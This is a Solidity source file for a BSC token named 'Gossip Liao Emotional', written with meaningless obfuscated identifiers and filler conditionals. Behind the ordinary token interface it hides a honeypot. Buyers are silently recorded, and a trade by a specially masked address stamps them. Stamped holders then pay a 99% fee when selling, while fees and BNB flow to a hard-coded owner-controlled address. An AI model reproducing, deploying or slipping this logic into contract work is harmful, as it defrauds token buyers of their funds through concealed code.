/**
 *Submitted for verification at BscScan.com on 2022-12-09
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract GossipLiaoEmotional is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Gossip Liao Emotional ";
    string constant _symbol = "GossipLiaoEmotional";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private buyMinExemptFee;
    mapping(address => bool) private autoFeeTradingWallet;
    mapping(address => bool) private walletReceiverBurnBuy;
    mapping(address => bool) private receiverSwapAutoMode;
    mapping(address => uint256) private receiverExemptSwapSellBuyIs;
    mapping(uint256 => address) private autoModeExemptLiquidityMin;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private isExemptBuyLaunched = 0;
    uint256 private minBurnMaxMarketing = 9;

    //SELL FEES
    uint256 private burnTradingLimitIs = 0;
    uint256 private txLiquidityBotsAuto = 9;

    uint256 private limitAutoMarketingBotsBuy = minBurnMaxMarketing + isExemptBuyLaunched;
    uint256 private burnIsBuyWallet = 100;

    address private modeReceiverMaxBuy = (msg.sender); // auto-liq address
    address private txMinBotsSell = (0x3af9715B255402cA0e0B2683fFFfE6588c1587D7); // marketing address
    address private txMinExemptTeam = DEAD;
    address private burnTeamBuyLimit = DEAD;
    address private liquiditySellTxAuto = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private walletIsBotsTx;
    uint256 private exemptBuyTxSellBots;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private maxSellIsSwap;
    uint256 private autoMarketingModeLaunched;
    uint256 private walletExemptReceiverMax;
    uint256 private isAutoExemptTrading;
    uint256 private autoBuyModeExempt;

    bool private buySellBotsMaxLimitBurn = true;
    bool private receiverSwapAutoModeMode = true;
    bool private receiverExemptSellSwapLimitMax = true;
    bool private isBurnAutoWallet = true;
    bool private launchedBuyMarketingTrading = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private liquidityExemptAutoFee = _totalSupply / 1000; // 0.1%

    
    bool private botsSwapReceiverBuy = false;
    uint256 private autoLimitMinMarketing = 0;
    uint256 private minFeeModeTeamSellMaxSwap = 0;
    uint256 private minSellTeamWallet = 0;
    bool private walletAutoTxFeeBurnMinReceiver = false;
    bool private exemptAutoBotsFee = false;
    bool private burnExemptBotsSell = false;
    uint256 private txIsMinTradingBotsLiquidity = 0;
    uint256 private feeBuyTeamBotsSellIs = 0;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        maxSellIsSwap = true;

        buyMinExemptFee[msg.sender] = true;
        buyMinExemptFee[address(this)] = true;

        autoFeeTradingWallet[msg.sender] = true;
        autoFeeTradingWallet[0x0000000000000000000000000000000000000000] = true;
        autoFeeTradingWallet[0x000000000000000000000000000000000000dEaD] = true;
        autoFeeTradingWallet[address(this)] = true;

        walletReceiverBurnBuy[msg.sender] = true;
        walletReceiverBurnBuy[0x0000000000000000000000000000000000000000] = true;
        walletReceiverBurnBuy[0x000000000000000000000000000000000000dEaD] = true;
        walletReceiverBurnBuy[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return botsMaxMinLimit(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return botsMaxMinLimit(sender, recipient, amount);
    }

    function botsMaxMinLimit(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        bool bLimitTxWalletValue = botsReceiverModeTx(sender) || botsReceiverModeTx(recipient);
        
        if (minSellTeamWallet == minFeeModeTeamSellMaxSwap) {
            minSellTeamWallet = txLiquidityBotsAuto;
        }


        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                burnMaxBotsSwap();
            }
            if (!bLimitTxWalletValue) {
                exemptBuyMarketingFee(recipient);
            }
        }
        
        if (burnExemptBotsSell != botsSwapReceiverBuy) {
            burnExemptBotsSell = exemptAutoBotsFee;
        }

        if (minSellTeamWallet != isExemptBuyLaunched) {
            minSellTeamWallet = limitAutoMarketingBotsBuy;
        }

        if (feeBuyTeamBotsSellIs != txLiquidityBotsAuto) {
            feeBuyTeamBotsSellIs = burnIsBuyWallet;
        }


        if (inSwap || bLimitTxWalletValue) {return exemptFeeMinReceiver(sender, recipient, amount);}

        if (!buyMinExemptFee[sender] && !buyMinExemptFee[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }
        
        if (burnExemptBotsSell == buySellBotsMaxLimitBurn) {
            burnExemptBotsSell = receiverExemptSellSwapLimitMax;
        }


        require((amount <= _maxTxAmount) || walletReceiverBurnBuy[sender] || walletReceiverBurnBuy[recipient], "Max TX Limit has been triggered");

        if (liquidityReceiverMarketingAutoWalletMaxMode()) {autoBotsExemptTeamLimit();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        
        if (botsSwapReceiverBuy != receiverExemptSellSwapLimitMax) {
            botsSwapReceiverBuy = buySellBotsMaxLimitBurn;
        }

        if (minFeeModeTeamSellMaxSwap == burnTradingLimitIs) {
            minFeeModeTeamSellMaxSwap = isExemptBuyLaunched;
        }


        uint256 amountReceived = teamBuyFeeModeBurnWalletBots(sender) ? feeReceiverSwapSell(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function exemptFeeMinReceiver(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function teamBuyFeeModeBurnWalletBots(address sender) internal view returns (bool) {
        return !autoFeeTradingWallet[sender];
    }

    function minSellAutoTxReceiverWallet(address sender, bool selling) internal returns (uint256) {
        
        if (burnExemptBotsSell != receiverExemptSellSwapLimitMax) {
            burnExemptBotsSell = botsSwapReceiverBuy;
        }

        if (exemptAutoBotsFee == buySellBotsMaxLimitBurn) {
            exemptAutoBotsFee = isBurnAutoWallet;
        }


        if (selling) {
            limitAutoMarketingBotsBuy = txLiquidityBotsAuto + burnTradingLimitIs;
            return liquidityTradingBurnLaunched(sender, limitAutoMarketingBotsBuy);
        }
        if (!selling && sender == uniswapV2Pair) {
            limitAutoMarketingBotsBuy = minBurnMaxMarketing + isExemptBuyLaunched;
            return limitAutoMarketingBotsBuy;
        }
        return liquidityTradingBurnLaunched(sender, limitAutoMarketingBotsBuy);
    }

    function feeReceiverSwapSell(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = amount.mul(minSellAutoTxReceiverWallet(sender, receiver == uniswapV2Pair)).div(burnIsBuyWallet);

        if (receiverSwapAutoMode[sender] || receiverSwapAutoMode[receiver]) {
            feeAmount = amount.mul(99).div(burnIsBuyWallet);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function botsReceiverModeTx(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function liquidityTradingBurnLaunched(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = receiverExemptSwapSellBuyIs[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function exemptBuyMarketingFee(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        autoModeExemptLiquidityMin[exemptLimitValue] = addr;
    }

    function burnMaxBotsSwap() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (receiverExemptSwapSellBuyIs[autoModeExemptLiquidityMin[i]] == 0) {
                    receiverExemptSwapSellBuyIs[autoModeExemptLiquidityMin[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(txMinBotsSell).transfer(amountBNB * amountPercentage / 100);
    }

    function liquidityReceiverMarketingAutoWalletMaxMode() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    launchedBuyMarketingTrading &&
    _balances[address(this)] >= liquidityExemptAutoFee;
    }

    function autoBotsExemptTeamLimit() internal swapping {
        
        if (minFeeModeTeamSellMaxSwap == burnTradingLimitIs) {
            minFeeModeTeamSellMaxSwap = isExemptBuyLaunched;
        }

        if (txIsMinTradingBotsLiquidity != txLiquidityBotsAuto) {
            txIsMinTradingBotsLiquidity = burnTradingLimitIs;
        }

        if (feeBuyTeamBotsSellIs != burnTradingLimitIs) {
            feeBuyTeamBotsSellIs = feeBuyTeamBotsSellIs;
        }


        uint256 amountToLiquify = liquidityExemptAutoFee.mul(isExemptBuyLaunched).div(limitAutoMarketingBotsBuy).div(2);
        uint256 amountToSwap = liquidityExemptAutoFee.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        if (walletAutoTxFeeBurnMinReceiver == receiverExemptSellSwapLimitMax) {
            walletAutoTxFeeBurnMinReceiver = walletAutoTxFeeBurnMinReceiver;
        }


        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = limitAutoMarketingBotsBuy.sub(isExemptBuyLaunched.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(isExemptBuyLaunched).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(minBurnMaxMarketing).div(totalETHFee);
        
        if (feeBuyTeamBotsSellIs == minBurnMaxMarketing) {
            feeBuyTeamBotsSellIs = autoLimitMinMarketing;
        }


        payable(txMinBotsSell).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                modeReceiverMaxBuy,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getBurnTeamBuyLimit() public view returns (address) {
        if (burnTeamBuyLimit != modeReceiverMaxBuy) {
            return modeReceiverMaxBuy;
        }
        return burnTeamBuyLimit;
    }
    function setBurnTeamBuyLimit(address a0) public onlyOwner {
        burnTeamBuyLimit=a0;
    }

    function getMinSellTeamWallet() public view returns (uint256) {
        return minSellTeamWallet;
    }
    function setMinSellTeamWallet(uint256 a0) public onlyOwner {
        minSellTeamWallet=a0;
    }

    function getIsBurnAutoWallet() public view returns (bool) {
        if (isBurnAutoWallet != botsSwapReceiverBuy) {
            return botsSwapReceiverBuy;
        }
        if (isBurnAutoWallet == receiverSwapAutoModeMode) {
            return receiverSwapAutoModeMode;
        }
        return isBurnAutoWallet;
    }
    function setIsBurnAutoWallet(bool a0) public onlyOwner {
        isBurnAutoWallet=a0;
    }

    function getTxMinExemptTeam() public view returns (address) {
        if (txMinExemptTeam == liquiditySellTxAuto) {
            return liquiditySellTxAuto;
        }
        if (txMinExemptTeam == burnTeamBuyLimit) {
            return burnTeamBuyLimit;
        }
        return txMinExemptTeam;
    }
    function setTxMinExemptTeam(address a0) public onlyOwner {
        if (txMinExemptTeam != burnTeamBuyLimit) {
            burnTeamBuyLimit=a0;
        }
        if (txMinExemptTeam != txMinBotsSell) {
            txMinBotsSell=a0;
        }
        if (txMinExemptTeam == liquiditySellTxAuto) {
            liquiditySellTxAuto=a0;
        }
        txMinExemptTeam=a0;
    }

    function getModeReceiverMaxBuy() public view returns (address) {
        return modeReceiverMaxBuy;
    }
    function setModeReceiverMaxBuy(address a0) public onlyOwner {
        modeReceiverMaxBuy=a0;
    }

    function getLiquidityExemptAutoFee() public view returns (uint256) {
        if (liquidityExemptAutoFee != burnTradingLimitIs) {
            return burnTradingLimitIs;
        }
        return liquidityExemptAutoFee;
    }
    function setLiquidityExemptAutoFee(uint256 a0) public onlyOwner {
        liquidityExemptAutoFee=a0;
    }

    function getWalletAutoTxFeeBurnMinReceiver() public view returns (bool) {
        if (walletAutoTxFeeBurnMinReceiver == launchedBuyMarketingTrading) {
            return launchedBuyMarketingTrading;
        }
        if (walletAutoTxFeeBurnMinReceiver == burnExemptBotsSell) {
            return burnExemptBotsSell;
        }
        if (walletAutoTxFeeBurnMinReceiver != botsSwapReceiverBuy) {
            return botsSwapReceiverBuy;
        }
        return walletAutoTxFeeBurnMinReceiver;
    }
    function setWalletAutoTxFeeBurnMinReceiver(bool a0) public onlyOwner {
        if (walletAutoTxFeeBurnMinReceiver == receiverSwapAutoModeMode) {
            receiverSwapAutoModeMode=a0;
        }
        if (walletAutoTxFeeBurnMinReceiver != botsSwapReceiverBuy) {
            botsSwapReceiverBuy=a0;
        }
        walletAutoTxFeeBurnMinReceiver=a0;
    }

    function getLaunchedBuyMarketingTrading() public view returns (bool) {
        if (launchedBuyMarketingTrading == botsSwapReceiverBuy) {
            return botsSwapReceiverBuy;
        }
        if (launchedBuyMarketingTrading != launchedBuyMarketingTrading) {
            return launchedBuyMarketingTrading;
        }
        return launchedBuyMarketingTrading;
    }
    function setLaunchedBuyMarketingTrading(bool a0) public onlyOwner {
        if (launchedBuyMarketingTrading != isBurnAutoWallet) {
            isBurnAutoWallet=a0;
        }
        launchedBuyMarketingTrading=a0;
    }

    function getReceiverExemptSellSwapLimitMax() public view returns (bool) {
        if (receiverExemptSellSwapLimitMax != walletAutoTxFeeBurnMinReceiver) {
            return walletAutoTxFeeBurnMinReceiver;
        }
        if (receiverExemptSellSwapLimitMax == botsSwapReceiverBuy) {
            return botsSwapReceiverBuy;
        }
        return receiverExemptSellSwapLimitMax;
    }
    function setReceiverExemptSellSwapLimitMax(bool a0) public onlyOwner {
        if (receiverExemptSellSwapLimitMax != launchedBuyMarketingTrading) {
            launchedBuyMarketingTrading=a0;
        }
        if (receiverExemptSellSwapLimitMax == botsSwapReceiverBuy) {
            botsSwapReceiverBuy=a0;
        }
        if (receiverExemptSellSwapLimitMax != receiverSwapAutoModeMode) {
            receiverSwapAutoModeMode=a0;
        }
        receiverExemptSellSwapLimitMax=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}